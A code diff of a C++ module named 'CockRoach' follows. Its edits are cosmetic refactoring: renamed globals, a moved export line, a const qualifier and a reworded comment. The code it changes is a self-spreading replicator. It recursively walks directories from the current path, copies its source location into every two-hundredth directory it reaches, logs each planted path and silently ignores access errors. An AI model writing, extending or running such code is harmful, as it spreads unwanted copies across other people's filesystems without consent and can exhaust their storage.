@@ -1,22 +1,22 @@
 module;
 
-export module CockRoach;
-
 #include <string>
 #include <stdexcept>
 #include <filesystem>
 #include <fstream> 
+
+export module CockRoach;
 
 namespace CockRoach
 {
 	namespace fs = std::filesystem;
 
 	constexpr auto NEED_TO_COPY{ 200 };
-	static auto g_Counter{ 0 };
+	static auto Counter{ 0 };
 
 	const auto DEFAULT_PATH{ fs::current_path() };
 
-	static std::ofstream g_LogFile{ "Log.txt" };
+	static std::ofstream LogFile{ "Log.txt" };
 
 	export void ScanDirectory(const std::string& start_directory = fs::current_path().generic_string(), const fs::path& from_copy = DEFAULT_PATH)
 	{	
@@ -43,30 +43,30 @@ namespace CockRoach
 
 		try
 		{
-			fs::directory_iterator directory_iter{ start_directory }; // here an exception is thrown for a directory that is not accessible
+			const fs::directory_iterator directory_iter{ start_directory }; // here an exception is thrown for a directory that is not accessible
 
 			for (const auto& elem : directory_iter)
 			{
 				if (check_valid(elem))
 				{
-					if (g_Counter == NEED_TO_COPY)
+					if (Counter == NEED_TO_COPY)
 					{
-						fs::copy(from_copy, elem.path());
-						g_LogFile << elem.path() << "\n";
+						copy(from_copy, elem.path());
+						LogFile << elem.path() << "\n";
 
-						g_Counter = 0;
+						Counter = 0;
 					}
 					else
 					{
-						++g_Counter;
+						++Counter;
 						ScanDirectory(elem.path().generic_string(), from_copy);
 					}	
 				}			
 			}
 		}
-		catch (const std::exception& )
+		catch (const std::exception&)
 		{
-			return; // this is necessary to exit the recursive function to a higher level
+			// (ignore) this is necessary to exit the recursive function to a higher level
 		}
 	}
 }
